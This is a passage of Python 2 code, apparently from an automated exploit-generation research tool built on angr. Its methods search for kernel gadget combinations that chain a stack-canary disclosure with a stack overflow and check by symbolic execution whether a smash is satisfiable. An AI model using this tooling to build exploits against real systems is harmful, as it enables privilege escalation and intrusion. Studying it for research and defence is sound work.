            if reach_target_fork_site: # already the target fork site
                print 'already reach target fork site, stop exploring'
                del simgr
                break

        return candidate_states

    def is_good_smash_site(self, active_state):
        """
        check is the state satisfy the requirement to smash the stack
        :param active_state:
        :return:
        """
        state = active_state.copy()
        print 'evaluating smash state...'
        # check if rdi is stack location
        if self.is_stack_address(state.se.eval(state.regs.rdi)):
            print '[+] rdi points to stack'
            # check if rsi is user space location
            state.add_constraints(state.regs.rsi < 0x7fff00000000)
            state.add_constraints(state.regs.rsi > 0x10000)
            # check if rdx is symbolic value
            if state.regs.rdx.symbolic:
                print '[+] rdx is symbolic'
                number_of_saved_register = self.current_smash_gadget[0]
                canary_position = self.current_smash_gadget[1]
                minimal_payload_len = canary_position + number_of_saved_register * 8 + 32
                state.add_constraints(state.regs.rdx > minimal_payload_len)
                state.add_constraints(state.regs.rdx < 0x2000)
                if state.satisfiable():
                    print '[+] rsi could point to userspace'
                    del state
                    return True
        del state
        return False

    def analyze_smash_gadget(self, smash_gadget):
        """
        analyze smash gadget
        :param smash_gadget:
        :return: list of sub gadget entries
        """
        sub_gadget_entry = []
        for sub_entry in smash_gadget[4]:
            sub_gadget_entry.append(sub_entry['addr'])
        return sub_gadget_entry

    def run_smash_gadget(self, states, smash_gadget, store_smash_state=True):
        good_smash_state = []
        self.current_smash_gadget = smash_gadget
        sub_gadget_entry = self.analyze_smash_gadget(self.current_smash_gadget)
        new_states = []
        for state in states:
            for gadget_entry in sub_gadget_entry:
                # copy states
                new_state = state.copy()
                # constraining new_state
                new_state.add_constraints(new_state.regs.rip == gadget_entry)
                # append state to new_states list which will be used in simulation manager
                new_states.append(new_state)

        simgr = self.b.factory.simgr(new_states, save_unconstrained=True)
        # we are only one step away from the site
        print 'stepping to the smash site'
        simgr.step()
        for active_state in simgr.stashes['active']:
            print active_state
            if self.is_good_smash_site(active_state):
                print colorama.Fore.RED + 'found good smash state...' + colorama.Style.RESET_ALL
                if store_smash_state is True:
                    good_smash_state.append([active_state.copy(), self.current_bloom_gadget, self.current_forking_gadget\
                                        , self.current_prologue_gadget, self.current_disclosure_gadget\
                                        , self.current_smash_gadget])
                else:
                    good_smash_state.append([self.current_bloom_gadget, self.current_forking_gadget\
                                        , self.current_prologue_gadget, self.current_disclosure_gadget\
                                        , self.current_smash_gadget])
                #import IPython; IPython.embed()

        del simgr
        del new_states
        return list(good_smash_state)

    def multiple_runs_smash_gadgets(self, good_disclosure_state, store_smash_state=True):
        """
        iterate over various smash gadget and check if smash requirement can be satisfied
        :param good_disclosure_state:
        :return:
        """
        # firstly try to explore until the second fork site state.
        second_fork_site_state = self.explore_state_for_second_fork_site(good_disclosure_state)
        if second_fork_site_state is None:
            print 'cannot find second fork site'
            return
        else:
            print colorama.Fore.CYAN + 'successfully found %d second fork site' % (len(second_fork_site_state))\
                + colorama.Style.RESET_ALL
            #import IPython; IPython.embed()
            for i, smash_gadget in enumerate(self.smash_gadgets):
                print '^^^^^^ checking %d/%d smash gadget ^^^^^^' % (i, len(self.smash_gadgets))
                # currently we do not handle rbp gadgets
                if smash_gadget[2] != 'rsp':
                    continue
                good_smash_states = self.run_smash_gadget(second_fork_site_state, smash_gadget, store_smash_state)
                if len(good_smash_states) > 0:
                    self.good_smash_states += list(good_smash_states)
                del good_smash_states
        return

    def doit_phase1(self):
        """
        the wrapper function to be called externally to find combination of bloom gadget and forking
        gadget that could potentially facilitate the generation of one-shot exploitation
        :return: nothing
        """
        if not os.path.isfile('good_bloom_gadget.cache'):  # have not get good bloom gadget yet
            self.multiple_runs_blooming_gadget()
        else:
            with open('good_bloom_gadget.cache','rb') as f:
                print '[+] loading good bloom gadget'
                self.good_bloom_gadget = pickle.load(f)


        if self.use_precomputed_good_bloom_and_fork_pair:
            if not os.path.isfile('good_bloom_fork_gadget_pair.cache'):
                print '[!] do not have cached good bloom and fork gadget pair'
                return
            else:  # has cache file of good bloom and fork gadgets pair
                with open('good_bloom_fork_gadget_pair.cache', 'rb') as f:
                    print('[+] loading good bloom-fork gadget pair')
                    self.good_bloom_fork_gadget_pair = pickle.load(f)
        else:  # do not use precomputed good bloom and fork pair, compute again
            # if not os.path.isfile('good_bloom_fork_gadget_pair.cache'):
            for i, good_bloom_gadget in enumerate(self.good_bloom_gadget):
                #if i % 2 == 0:
                    #continue
                print '[+] ----- checking %d/%d th good bloom gadget' % (i, len(self.good_bloom_gadget))
                #if i == 1:
                self.multiple_runs_forking_gadget(good_bloom_gadget)
                print '[+] ----- currently we have %d bloom and fork pairs' % len(self.good_bloom_fork_gadget_pair)

            for good_bloom_fork_gadget_pair in self.good_bloom_fork_gadget_pair:
                print good_bloom_fork_gadget_pair
            print 'there are %d good bloom gadget and fork pair verified by symbolic execution'\
                    % (len(self.good_bloom_fork_gadget_pair))
            #raw_input()

            with open('good_bloom_fork_gadget_pair.cache', 'wb') as f:
                # fixed serilization bug, we can not serilize state in a user hook, but do we really need such a state?
                print 'serilizing good bloom and fork gadgets pair'
                if self.serilize_good_bloom_fork_gadget_pair:
                    pickle.dump(self.good_bloom_fork_gadget_pair, f, -1)
                pass

        for good_bloom_and_fork_gadget in self.good_bloom_fork_gadget_pair:
            print good_bloom_and_fork_gadget[0][1], good_bloom_and_fork_gadget[1][1]

        #import IPython; IPython.embed()
        #return

    def doit_phase2(self):
        """
        chaining up the stack overflow and the stack disclosure
        :return:
        """

        self.prologue_disclosure_pairs = self.get_prologue_disclosure_pairs()
        # import IPython; IPython.embed()
        if self.use_precomputed_disclosure_state:
            good_disclosure_state_dump_files = self.get_good_disclosure_state_dumps()
            if len(good_disclosure_state_dump_files) > 0:
                for good_disclosure_state_dump_file in good_disclosure_state_dump_files:
                    print 'loading %s from pickle dump' % good_disclosure_state_dump_file
                    with open(good_disclosure_state_dump_file) as f:
                        tmp_states = pickle.load(f)
                        self.good_disclosure_state += tmp_states

        if len(self.good_disclosure_state) == 0:
            if self.initial_state is None:
                initial_state = self.get_initial_state(switch_cpu=True, extra_options=\
                    angr.options.AVOID_MULTIVALUED_WRITES)
                self.initial_state = initial_state
            for i, good_bloom_and_fork_gadget in enumerate(self.good_bloom_fork_gadget_pair):
                print '------ checking %d/%d pair of good bloom and fork gadget' % (i, \
                                                                                len(self.good_bloom_fork_gadget_pair))
                #if i < 6:
                    #continue
                if self.dump_good_disclosure_state_discretely:
                    self.good_disclosure_state = [ ]
                self.multiple_runs_prologue_and_disclosure_gadgets(good_bloom_and_fork_gadget)
                if self.dump_good_disclosure_state_discretely and len(self.good_disclosure_state) > 0:
                    with open('good_disclosure_state_' + str(i) + '.cache', 'wb') as f:
                        print 'serilizing good disclosure state for a pair of bloom and fork gadget'
                        pickle.dump(self.good_disclosure_state, f, -1)
                #raw_input('con?')
            if self.dump_good_disclosure_state_together:
                with open('good_disclosure_state.cache', 'wb') as f:
                    print 'serilizing in total %d good disclosure state for a pair of bloom and fork gadget' % \
                          (len(self.good_disclosure_state))
                    pickle.dump(self.good_disclosure_state, f, -1)

        print 'end of the whole thing, pop up python shell for you to inspect'
        if not os.path.isfile('unsatisfiable_state.bin'):
            if len(self.unsatisfiable_state) > 0:
                with open('unsatisfiable_state.bin', 'wb') as f:
                    pickle.dump(self.unsatisfiable_state, f, -1)
        #else:
            #if len(self.unsatisfiable_state) > 0:
                #with open('unsatisfiable_state.bin', 'rb') as f:
                    #self.unsatisfiable_state = pickle.load(f)

        #import IPython; IPython.embed()

        if self.explore_smash_gadget:
            print '[+] final stage, exploring smash gadget'
            if len(self.good_disclosure_state) > 0:
                print '[+] has %d good disclosure state' % (len(self.good_disclosure_state))
                for i, good_disclosure_state in enumerate(self.good_disclosure_state):
                    print '****** checking %d/%d good disclosure states.. *******' % (i+1, \
                                                                                      len(self.good_disclosure_state))
                    self.multiple_runs_smash_gadgets(good_disclosure_state)

            pass

        print 'there are %d good_smash_states' % (len(self.good_smash_states))
        if self.dump_good_smash_state_together:
            with open('good_smash_state.cache', 'wb') as f:
                print '[.] serilizing good smash state'
                pickle.dump(self.good_smash_states, f, -1)
        import IPython; IPython.embed()

    def doit_phase2_compact(self, start_bloom_and_fork_pair_idx=0):
        """
        chaining up the stack overflow and the stack disclosure
        :return:
        """
        total_good_smash_gadget = 0
        self.prologue_disclosure_pairs = self.get_prologue_disclosure_pairs()
        # import IPython; IPython.embed()
        if self.use_precomputed_disclosure_state:
            good_disclosure_state_dump_files = self.get_good_disclosure_state_dumps()
            if len(good_disclosure_state_dump_files) > 0:
                for good_disclosure_state_dump_file in good_disclosure_state_dump_files:
                    print 'loading %s from pickle dump' % good_disclosure_state_dump_file
                    with open(good_disclosure_state_dump_file) as f:
                        tmp_states = pickle.load(f)
                        self.good_disclosure_state += tmp_states

        if len(self.good_disclosure_state) == 0:  # do not have deserialized any good disclosure states
            if self.initial_state is None:
                initial_state = self.get_initial_state(switch_cpu=True, extra_options=\
                    angr.options.AVOID_MULTIVALUED_WRITES)
                self.initial_state = initial_state
            for i, good_bloom_and_fork_gadget in enumerate(self.good_bloom_fork_gadget_pair):
                if i < start_bloom_and_fork_pair_idx:
                    continue  # pass
                ts = time.time()
                st = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
                print st,
                print 'Now we have in total %d good smash state' % total_good_smash_gadget
                print '------ checking %d/%d pair of good bloom and fork gadget' % (i,\
                    len(self.good_bloom_fork_gadget_pair))
                self.multiple_runs_prologue_and_disclosure_gadgets(good_bloom_and_fork_gadget)
                if self.dump_good_disclosure_state_discretely and len(self.good_disclosure_state) > 0:
                    with open('good_disclosure_state_' + str(i) + '.cache', 'wb') as f:
                        print 'serilizing good disclosure state for a pair of bloom and fork gadget'
                        pickle.dump(self.good_disclosure_state, f, -1)
                if self.explore_smash_gadget:
                    print '[+] final stage, exploring smash gadget'
                    del self.good_smash_states
                    self.good_smash_states = []  # reset
                    if len(self.good_disclosure_state) > 0:
                        print '[+] has %d good disclosure state' % (len(self.good_disclosure_state))
                        for ii, good_disclosure_state in enumerate(self.good_disclosure_state):
                            print '****** checking %d/%d good disclosure states.. *******' % (ii + 1, \
                                len(self.good_disclosure_state))
                            self.multiple_runs_smash_gadgets(good_disclosure_state, store_smash_state=False)
                            total_good_smash_gadget += len(self.good_smash_states)
                filename = 'good_smash_gadget_of_good_pair'+str(i)+'.dump'
                print 'dumping good smash gadgets'
                with open(filename, 'wb') as f:
                    pickle.dump(self.good_smash_states, f, -1)
                for disclosure_state in self.good_disclosure_state:
                    del disclosure_state
                del self.good_disclosure_state
                self.good_disclosure_state = []
                if self.not_saving_unsatisfiable_states:
                    for s in self.unsatisfiable_state:
                        del s
                    del self.unsatisfiable_state
                    self.unsatisfiable_state=[]
                if self.inspect_phase_2:
                    import IPython; IPython.embed()

        print 'there are %d good_smash_states' % (len(self.good_smash_states))
        if self.dump_good_smash_state_together:
            with open('good_smash_state.cache', 'wb') as f:
                print '[.] serilizing good smash state'
                pickle.dump(self.good_smash_states, f, -1)
        print 'end of the whole thing, pop up python shell for you to inspect'
        import IPython; IPython.embed()
